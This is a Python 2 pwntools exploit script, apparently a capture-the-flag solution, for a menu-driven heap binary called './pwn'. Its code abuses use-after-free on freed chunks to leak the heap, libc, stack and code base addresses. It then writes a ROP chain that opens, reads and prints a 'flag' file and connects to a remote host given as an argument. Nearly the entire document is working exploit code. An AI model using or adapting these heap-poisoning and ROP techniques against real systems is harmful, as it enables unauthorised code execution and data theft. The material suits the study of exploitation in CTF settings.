#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'

execve_file = './pwn'
lib_file = './libc.so.6'
argv = []



'''
	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址
	elf.got[`symbol`] 获取elf文件中导入符号的got地址
	elf.sym['symbol'] 获取elf文件中本地符号的函数实际地址
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] 获取lib中符号地址
	lib.search['string'].next() 获取lib中字符串地址
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	执行爆破攻击
	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
	否则程序一直进行循环
'''


def wp_add(r, idx, size):
	r.sendlineafter('>> \n', str(1))
	r.sendlineafter('input index:\n', str(idx))
	r.sendlineafter('input size:\n', str(size))

def wp_delete(r, idx):
	r.sendlineafter('>> \n', str(2))
	r.sendlineafter('input index:\n', str(idx))

def wp_edit(r, idx, context):
	r.sendlineafter('>> \n', str(3))
	r.sendlineafter('input index:\n', str(idx))
	r.sendlineafter('input context:\n', context)


def wp_show(r, idx):
	r.sendlineafter('>> \n', str(4))
	r.sendlineafter('input index:\n', str(idx))

def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv)	# 首先加载当前目录下的动态库文件
		r = process([execve_file] + argv)	# 首先加载当前目录下的动态库文件
	else:
		r = remote(sys.argv[1], sys.argv[2])
	
	for i in range(12):
		wp_add(r, i, 0x50)	#base + 0x60 * i
	
	#fake chunk: base + 0x20
	wp_delete(r, 1)
	wp_delete(r, 0)
	wp_show(r, 0)
	chunk_base = u64(r.recv(6).ljust(8, '\x00')) - 0x60 - 0x10
	log.info('chunk_base => %#x'%(chunk_base))
	wp_edit(r, 11, p64(0) * 2 + p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21))
	wp_edit(r, 0, p64(chunk_base + 0x30) + p64(0) + p64(0) + p64(0x421) + p64(0))


	# get the fake chunk and free
	wp_add(r, 0, 0x50)	#base
	wp_add(r, 13, 0x50)	#base + 0x20
	wp_delete(r, 13)
	wp_show(r, 13)
	lib_base = u64(r.recv(6).ljust(8, '\x00')) - 0x7fddc0f01ca0 + 0x7fddc0b16000
	log.info('lib_base => %#x'%(lib_base))

	# get the stack
	wp_delete(r, 3)
	wp_delete(r, 2)
	wp_edit(r, 2, p64(lib_base + lib.sym['environ']))
	wp_add(r, 2, 0x50)
	wp_add(r, 13, 0x50)
	wp_show(r, 13)
	edit_stack = u64(r.recv(6).ljust(8, '\x00')) - 0x7ffcb363c768 + 0x7ffcb363c640
	log.info('edit_stack => %#x'%(edit_stack))

	# get the code
	wp_delete(r, 5)
	wp_delete(r, 4)
	wp_edit(r, 4, p64(edit_stack + 0x10 + 8))
	wp_add(r, 4, 0x50)
	wp_add(r, 4, 0x50)
	wp_show(r, 4)
	code_base = u64(r.recv(6).ljust(8, '\x00')) - 0xfe1
	log.info('code_base => %#x'%(code_base))


	# rop: read(0, buf, 0x200)
	edit_stack = edit_stack + 0x10 + 8
	shellcode = p64(code_base + 0x104a) + p64(0) + p64(1) + p64(code_base + elf.got['read']) + p64(0) + p64(edit_stack + 0x8 * 8) + p64(8 * 31 + len('flag') + 1) + p64(code_base + 0x1030) + p64(0) + p64(0)[:-1]
	wp_edit(r, 4, shellcode)

	edit_stack = edit_stack + 0x8 * 8
	flag_addr = edit_stack + 8 * 31
	shellcode = p64(0) * 7 + p64(code_base + 0x1053) + p64(flag_addr) + p64(code_base + 0x1051) + p64(4) + p64(0) + p64(lib_base + lib.sym['open']) + p64(code_base + 0x104a) + p64(0) + p64(1) + p64(code_base + elf.got['read']) + p64(3) + p64(flag_addr) + p64(0x40) + p64(code_base + 0x1030) + p64(0) * 7 + p64(code_base + 0x1053) + p64(flag_addr) + p64(code_base + elf.plt['puts'])
	r.send(shellcode + 'flag\x00')
	r.interactive()


exp()
log.info('-----------------------------------------------------------')
